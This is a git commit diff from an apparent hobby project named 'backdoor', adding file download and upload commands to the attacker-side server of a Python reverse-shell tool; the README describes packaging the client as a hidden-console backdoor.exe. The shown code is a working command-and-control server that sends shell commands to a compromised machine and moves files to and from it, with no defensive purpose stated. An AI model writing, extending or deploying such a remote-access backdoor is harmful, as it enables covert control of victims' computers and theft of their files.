b4e92f2010f6eef5b598120c5e50f21e524406d5
Jean-Paul Abi-Ghosn <jp.abighosn.98@gmail.com>
2023-11-18 09:15:09 +0200

    Adding download/upload file

--- README.md
+++ README.md
@@ -4,3 +4,7 @@ pyinstaller backdoor.py --onefile --noconsole
 
 In the dist folder, you'll have backdoor.exe
 
+To run
+```
+python3 server.py
+```
--- server.py
+++ server.py
@@ -2,20 +2,6 @@ import socket
 import json
 import os
 
-def target_comunication():
-    while True:
-        command = input('* Shell~%s: ' % str(ip))
-        reliable_send(command)
-        if command == 'quit':
-            break
-        elif command == 'clear':
-            os.system('clear')
-        elif command[:3] == 'cd ':
-            pass
-        else:
-            result = reliable_recv()
-            print(result)
-
 def reliable_send(data):
     jsondata = json.dumps(data)
     target.send(jsondata.encode())
@@ -28,6 +14,43 @@ def reliable_recv():
             return json.loads(data)
         except ValueError:
             continue
+
+def target_comunication():
+    while True:
+        command = input('* Shell~%s: ' % str(ip))
+        reliable_send(command)
+        if command == 'quit':
+            break
+        elif command == 'clear':
+            os.system('clear')
+        elif command[:3] == 'cd ':
+            pass
+        elif command[:8] == 'donwload':
+            download_file(command[9:])
+        elif command[:6] == 'upload':
+            upload_file(command[7:])
+        else:
+            result = reliable_recv()
+            print(result)
+
+def download_file(file_name):
+    f = open(file_name, 'wb')
+    target.settimeout(1)
+    chunk = target.recv(1024)
+    while chunk:
+        f.write(chunk)
+        try:
+            chunk = target.recv(1024)
+        except sock.timeout as e:
+            break
+    target.settimeout(None)
+    f.close()
+
+
+def upload_file(file_name):
+    f = open(file_name, 'rb')
+    target.send(f.read())
+
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.bind(('192.168.1.12', 5555))
